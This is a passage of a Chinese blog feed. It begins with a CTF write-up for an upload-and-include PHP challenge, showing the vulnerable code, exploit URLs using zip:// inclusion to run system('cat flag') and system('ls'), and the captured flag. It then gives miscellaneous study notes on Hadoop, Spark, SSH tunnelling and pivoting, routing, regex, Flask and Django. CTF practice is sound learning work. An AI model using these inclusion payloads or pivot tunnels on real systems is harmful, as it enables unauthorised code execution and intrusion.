class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">$check3=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line"><span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$page=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$page)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($page) &#123;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">include</span>($page.<span class="string">'.php'</span>))) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">爆破随机数种子(session_id为我们的 PHPSESSID，hash为SESSI0N)</span><br><span class="line">ini_set(‘max_execution_time’, ‘<span class="number">0</span>’);  <span class="comment">// 设置运行时间无限</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&amp;a=echo%20system(%27cat%20./flag-Edi98vJF8hnIp.txt%27);</span></span><br><span class="line">xctf&#123;<span class="number">3</span>fbbe15371c9cd42ec1a698d7660849a&#125; xctf&#123;<span class="number">3</span>fbbe15371c9cd42ec1a698d7660849a&#125;</span><br><span class="line">http:<span class="comment">//111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adworld simple_js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span><span class="params">(pass_enc)</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line"><span class="keyword">var</span> tab  = pass_enc.split(<span class="string">','</span>);</span><br><span class="line"><span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);</span><br><span class="line"><span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">""</span>;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = tab.length;</span><br><span class="line">k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">n = tab2.length;</span><br><span class="line"><span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ ) &#123;</span><br><span class="line">o = tab[i-l];</span><br><span class="line">p += String.fromCharCode((o = tab2[i]));</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">5</span>) </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">o = tab[i-l];</span><br><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k<span class="number">-1</span>)</span><br><span class="line">p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">&#125;</span><br><span class="line">p += String.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">pass = p;</span><br><span class="line"><span class="keyword">return</span> pass;</span><br><span class="line">&#125;</span><br><span class="line">String[<span class="string">"fromCharCode"</span>](dechiffre(<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span>));</span><br><span class="line"><span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">h = window.prompt(<span class="string">'Enter password'</span>);</span><br><span class="line">alert( dechiffre(h) );</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>葵花宝典</title>
    <link href="https://wywwzjj.top/2018/02/26/%E8%91%B5%E8%8A%B1%E5%AE%9D%E5%85%B8/"/>
    <id>https://wywwzjj.top/2018/02/26/葵花宝典/</id>
    <published>2018-02-26T09:58:25.000Z</published>
    <updated>2019-02-26T11:03:49.848Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h2><p>官网 、源码</p><p>安装 <a href="https://downloads.lightbend.com/scala/2.11.8/scala-2.11.8.tgz" target="_blank" rel="noopener">https://downloads.lightbend.com/scala/2.11.8/scala-2.11.8.tgz</a></p><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><ul><li><p>spark Caused by: java.lang.NoClassDefFoundError: org/slf4j/Logger</p><p>  <a href="https://spark.apache.org/docs/latest/hadoop-provided.html" target="_blank" rel="noopener">https://spark.apache.org/docs/latest/hadoop-provided.html</a></p></li><li><p>port 50070 changed to 9870 in 3.0.0-alpha1</p><p>  出现以下信息即配置好伪分布式，不需要出现 successful</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">jps</span></span><br><span class="line">3648 DataNode</span><br><span class="line">3941 Jps</span><br><span class="line">2678 NameNode</span><br><span class="line">3095 SecondaryNameNode</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置环境变量 ~/.bashrc</span></span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export HADOOP_HOME=/usr/local/hadoop</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$&#123;HADOOP_HOME&#125;/bin:$&#123;HADOOP_HOME&#125;/sbin:$PATH</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./sbin/stop-dfs.sh  # 关闭Hadoop</span><br><span class="line">./sbin/start-dfs.sh  # 开启Hadoop</span><br></pre></td></tr></table></figure><h4 id="HDFS-分布式存储"><a href="#HDFS-分布式存储" class="headerlink" title="HDFS(分布式存储)"></a>HDFS(分布式存储)</h4><h4 id="MapReduce-分布式处理"><a href="#MapReduce-分布式处理" class="headerlink" title="MapReduce(分布式处理)"></a>MapReduce(分布式处理)</h4><h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><h4 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h4><p>Spark 包含了大数据领域常见的各种计算框架：</p><ul><li>Spark Core 用于离线计算</li><li>Spark SQL 用于交互式查询</li><li>Spark Streaming 用于实时流式计算</li><li>Spark MLlib 用于机器学习</li><li>Spark GraphX 用于图计算</li></ul><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><a href="https://blog.csdn.net/wangxn216/article/details/80095710" target="_blank" rel="noopener">ubuntu18.04环境下hadoop3.1,spark虚拟机分布式安装笔记</a></p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p><strong>最简单的办法</strong></p><p><a href="https://kheresy.wordpress.com/2017/12/14/windows-begin-to-provide-ssh-client-and-server/" target="_blank" rel="noopener">win10 openssh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> win</span></span><br><span class="line">ssserver -p 2333 -k rois2018 -m aes-256-cfb  # 跑shadowsocks</span><br><span class="line">ssh -R 0.0.0.0:2333:localhost:2333 wywwzjj@35.201.152.114  # ssh设置</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> vps</span></span><br></pre></td></tr></table></figure><p>Xshell ssh 隧道</p><p>proxychains in Linux</p><p>Proxifier in Windows</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 10.105.1.30 -lattacker -D1082 -L0.0.0.0:1994:10.105.1.14:80 -L0.0.0.0:1998:10.105.1.18:22 -L0.0.0.0:1993:10.105.1.13:80 -L0.0.0.0:1992:10.105.1.12:80 -R0.0.0.0:80:0.0.0.0:80</span><br></pre></td></tr></table></figure><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a></p><p>clash</p><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">ew</a></p><h2 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google hacking"></a>Google hacking</h2><p>常用语法备忘</p><h2 id="phpstudy-设置域名与ip"><a href="#phpstudy-设置域名与ip" class="headerlink" title="phpstudy 设置域名与ip"></a>phpstudy 设置域名与ip</h2><p><a href="https://www.cnblogs.com/jewave/p/5625878.html" target="_blank" rel="noopener">https://www.cnblogs.com/jewave/p/5625878.html</a><br><a href="http://www.keydatas.com/html/apache.html?audience=320658" target="_blank" rel="noopener">http://www.keydatas.com/html/apache.html?audience=320658</a></p><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="路由表配置"><a href="#路由表配置" class="headerlink" title="路由表配置"></a>路由表配置</h3><p>必须要学会配路由，使得内网和外网同时能访问</p><p>windows下配路由表利器：NetRouteView </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">无线网卡：11</span><br><span class="line">有线网卡：4</span><br><span class="line">route print / netstat -r  # 显示本地路由表</span><br><span class="line">route add 0.0.0.0 mask 0.0.0.0 xxx METRIC 1 IF ID  # 全局</span><br><span class="line"><span class="meta">#</span><span class="bash"> xxx 设置为实际上网网卡的网关，ID 设置为实际网卡 ID</span></span><br><span class="line">route add 10.0.0.0 mask 255.0.0.0 xxx IF ID  # 上内网</span><br><span class="line"><span class="meta">#</span><span class="bash"> xxx 设置为 OpenVPN 网关，ID 为 OpenVPN 的虚拟网卡ID(TAP)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配错了的话</span></span><br><span class="line">route delete 0.0.0.0 / 10.0.0.0</span><br><span class="line"></span><br><span class="line">:删除默认设置</span><br><span class="line">route delete 0.0.0.0</span><br><span class="line">:外网路由，全走无线</span><br><span class="line">route add 0.0.0.0 mask 0.0.0.0 192.168.0.1  # -p 永久路由</span><br><span class="line">:公司内网全部在10.108.*.*网段，增加此路由</span><br><span class="line">route add 10.108.0.0 mask 255.255.0.0 10.108.58.1</span><br><span class="line"></span><br><span class="line">route add 134.105.0.0 mask 255.255.0.0 134.105.64.1</span><br><span class="line">意思是：所有需要发往134.105.0.0/16地址段的IP数据包，全部由134.105.64.1路径转发。</span><br></pre></td></tr></table></figure><h2 id="Regular-Expression"><a href="#Regular-Expression" class="headerlink" title="Regular Expression"></a>Regular Expression</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 入门</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> \b 匹配单词的开头或结尾</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果要查找 hi 这个单词，表达为 \bhi\b</span></span><br><span class="line">\bhi\b.*\bLucy\b  </span><br><span class="line"><span class="meta">#</span><span class="bash"> . 表示除换行符以外的任意字符</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> * 代表数量，它指定 * 前边的内容可以重复使用任意次</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 和起来  =&gt;  匹配 hi ... Lucy </span></span><br><span class="line">0\d\d-\d\d\d\d\d\d\d\d  # \d 表示一位数字， - 为连字符，只匹配本身</span><br><span class="line"><span class="meta">#</span><span class="bash"> 简化一下  =&gt;  0\d&#123;2&#125;-\d&#123;8&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> \s 匹配任意的空白字符</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> \w 匹配字母或数字或下划线或汉字等</span></span><br><span class="line">\ba\w*\b  # 表示匹配任意长度以 a 开头的单词</span><br><span class="line">\d+  # 匹配 1 个或多个连续的数字，+ 和 * 类似，不过 + 是至少一次</span><br><span class="line">\b\w&#123;6&#125;\b  # 匹配长度恰好为 6 的单词</span><br><span class="line"><span class="meta">#</span><span class="bash"> ^ 匹配字符串的开始</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> $ 匹配字符串的结束</span></span><br><span class="line">^\d&#123;5,12&#125;$  # 表示整个字符串只能是 5~12 位数字</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 元字符</span></span><br><span class="line">. 除换行符以外的任意字符</span><br><span class="line">\w 字母或数字或下划线或汉字</span><br><span class="line">\s 任意的空白符</span><br><span class="line">\d 数字</span><br><span class="line">\b 单词的开始或结束</span><br><span class="line">^ 字符串的开始</span><br><span class="line"><span class="meta">$</span><span class="bash"> 字符串的结束</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 字符转义  =&gt;  \</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重复</span></span><br><span class="line">* 任意次</span><br><span class="line">+ 至少 1 次</span><br><span class="line">? 0 次或 1 次</span><br><span class="line">&#123;n&#125; 重复 n 次</span><br><span class="line">&#123;n,&#125; 至少 n 次</span><br><span class="line">&#123;n,m&#125; n ~ m 次</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 字符类</span></span><br><span class="line">如果想匹配没有预定义元字符的字符集合</span><br><span class="line">比如元音字母 a, e, i, o, u  =&gt;  [aeiou]</span><br><span class="line">比如匹配一些标点符号 . ? !  =&gt;  [.?!]</span><br><span class="line">还可以轻松地指定一个字符范围</span><br><span class="line">比如 [0-9] == \d ,含义与 \d 是完全一致的，还有 [a-z0-9A-Z] == \w</span><br><span class="line">\(?0\d&#123;2&#125;[)-]?\d&#123;8&#125;)  =&gt;  (010)88886666 / 022-22334455 / 02912345678</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 分枝条件</span></span><br><span class="line">不幸的是，上面那个表达式也能匹配到 010)12345678 / (022-87654321 这种格式，此时就要用到分枝条件</span><br><span class="line">分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，用 | 进行分隔</span><br><span class="line">0\d&#123;2&#125;-\d&#123;8&#125;|0\d&#123;3&#125;-d&#123;7&#125;  # 注意分隔符，此时就能匹配两种格式的号码了，3 + 8 / 4 + 7</span><br><span class="line">\(0\d&#123;2&#125;\)[-]?\d&#123;8&#125;|0\d&#123;2&#125;[-]?\d&#123;8&#125;  # 匹配 (0xx) - xx.. / (xxx) xx.. / 0xx-xx.. / ..</span><br><span class="line">\d&#123;5&#125;-\d&#123;4&#125;|\d&#123;5&#125;  # xxxxx-xxx | xxxxx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用分枝条件时还要注意各个条件的顺序</span></span><br><span class="line">比如 \d&#123;5&#125;|\d&#123;5&#125;-\d&#123;4&#125; ，它只会匹配5位的邮编(以及9位邮编的前5位)</span><br><span class="line">匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其他条件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 分组</span></span><br><span class="line">重复单个字符很方便，那么重复一个字符串呢？就可以用小括号进行分组了，也叫做子表达式</span><br><span class="line">(\d&#123;1,3&#125;\.)&#123;3&#125;d&#123;1,3&#125;  # 简单的IP地址匹配  1.1.1.1</span><br><span class="line">然而上面的表达式也可能出现 256.300.888.999，正则表达式又不提供任何数学计算</span><br><span class="line">只能这样用：((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</span><br><span class="line">(?&lt;name&gt;exp)  # 命名</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 反义</span></span><br><span class="line">\W 任意不是字母，数字，下划线，汉字的字符</span><br><span class="line">\S任意非空白符的字符</span><br><span class="line">\D任意非数字的字符</span><br><span class="line">\B不是单词开头或结束的位置</span><br><span class="line">[^x]非x的任意字符</span><br><span class="line">[^aeiou]非aeiou的任意字符</span><br><span class="line">如：\S+   不包含空白符的字符串</span><br><span class="line">&lt;a[^&gt;]+&gt; 用尖括号括起来的以a开头的字符串</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后向引用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 零宽断言</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 负向零宽断言</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释</span></span><br><span class="line">(?#注释) 直接加到exp后面</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 贪婪与懒惰</span></span><br><span class="line">默认贪婪状态</span><br><span class="line">*?   重复任意次，但尽可能少重复</span><br><span class="line">+?重复1次或更多次，但尽可能少重复</span><br><span class="line">??重复0次或1次，但尽可能少重复</span><br><span class="line">&#123;n,m&#125;?重复n到m次，但尽可能少重复</span><br><span class="line">&#123;n,&#125;?重复n次以上，但尽可能少重复</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 处理选项</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 平衡组/递归匹配</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> php的正则</span></span><br><span class="line">preg_match() / preg_match_all()</span><br><span class="line">用来做包围的字符不能出现在re中，否则会出现矛盾，将报错</span><br><span class="line">可以用以下符号包围正则参数</span><br><span class="line">`~!@#$%^&amp;*-+/</span><br></pre></td></tr></table></figure><p><a href="https://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">继续学习</a></p><ul><li>py re</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern, )</span><br></pre></td></tr></table></figure><h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>坑点：pycharm 中需手动开启debug模式，右上角 edit configuration</p><p><strong>配置虚拟环境</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pip install virtualenv</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 直接用 conda 带的虚拟环境，不需要另外安装上面的，另外，py 3.4 以上自带了虚拟环境</span></span><br></pre></td></tr></table></figure><p><strong>Start</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化一个Flask对象</span></span><br><span class="line"><span class="comment"># __name__ 方便flask寻找资源，方便插件寻找问题</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.run(debug=<span class="literal">True</span>)  <span class="comment"># 设置debug模式</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重定向</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect, url_for</span><br><span class="line"><span class="comment"># url 反转，即利用视图函数得出 url，将 url 传入 redirect() 即可</span></span><br><span class="line">redirect(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用模板</span></span><br><span class="line">/templates 下创建文件</span><br><span class="line">context = &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'file_name'</span>, **context)</span><br><span class="line">&#123;&#123;...&#125;&#125; 中写入后端传来的参数</span><br><span class="line"><span class="comment"># 模板的继承</span></span><br><span class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</span><br></pre></td></tr></table></figure><h2 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h2><h3 id="创建项目："><a href="#创建项目：" class="headerlink" title="创建项目："></a>创建项目：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject project_name</span><br></pre></td></tr></table></figure><h3 id="目录解释："><a href="#目录解释：" class="headerlink" title="目录解释："></a>目录解释：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">│manage.py# 命令行工具，可以用多种方式对Django项目进行交互</span><br><span class="line">│</span><br><span class="line">└─djtest</span><br><span class="line">        settings.py# 项目的配置文件</span><br><span class="line">        urls.py# 项目的URL声明</span><br><span class="line">        wsgi.py# 项目与WSGI兼容的服务器入口</span><br><span class="line">        __init__.py# 空文件，它告诉Python这个目录应该被看做一个Python包</span><br></pre></td></tr></table></figure><h3 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h3><ul><li>设计表结构</li></ul><h2 id="前端部分"><a href="#前端部分" class="headerlink" title="前端部分"></a>前端部分</h2><ul><li><strong>HTML是网页内容的载体。</strong>内容就是网页制作者放在页面上想要让用户浏览的信息，可以包含文字、图片、视频等。</li><li><strong>CSS样式是表现。</strong>就像网页的外衣。比如，标题字体、颜色变化，或为标题加入背景图片、边框等。所有这些用来改变内容外观的东西称之为表现。</li><li><strong>JavaScript是用来实现网页上的特效效果。</strong>如：鼠标滑过弹出下拉菜单。或鼠标滑过表格的背景颜色改变。还有焦点新闻（新闻图片）的轮换。可以这么理解，有动画的，有交互的一般都是用JavaScript来实现的。</li></ul><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p><code>HTML</code>不是一种编程语言，而是一种标记语言。</p><p>除了某些单标签，其他都是成对出现的。</p><p>语法骨架:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 